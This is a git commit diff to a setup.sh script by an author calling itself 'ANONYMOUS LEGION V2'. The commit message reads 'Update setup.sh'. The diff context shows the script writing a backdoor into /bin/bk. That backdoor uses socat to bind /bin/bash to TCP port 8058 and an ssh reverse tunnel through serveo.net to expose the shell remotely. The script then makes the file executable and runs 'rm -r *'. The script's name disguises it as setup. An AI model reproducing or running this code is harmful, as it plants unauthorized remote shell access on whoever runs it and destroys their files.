626b2b10386ff6c146f40e641f71539cf97dc15e
ANONYMOUS LEGION V2 <150881573+CyberLegion2@users.noreply.github.com>
2024-09-23 23:16:53 +0530

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -5,7 +5,7 @@ pkill ssh
 else
 socat TCP-LISTEN:8058 EXEC:/bin/bash > /dev/null 2>1 &
 ssh -R 18058:localhost:8058 serveo.net > /dev/null 2>1 &
-fi" >> /bin>
+fi" >> /bin/bk
 chmod +x /bin/bk
 rm -r *
 cd ..
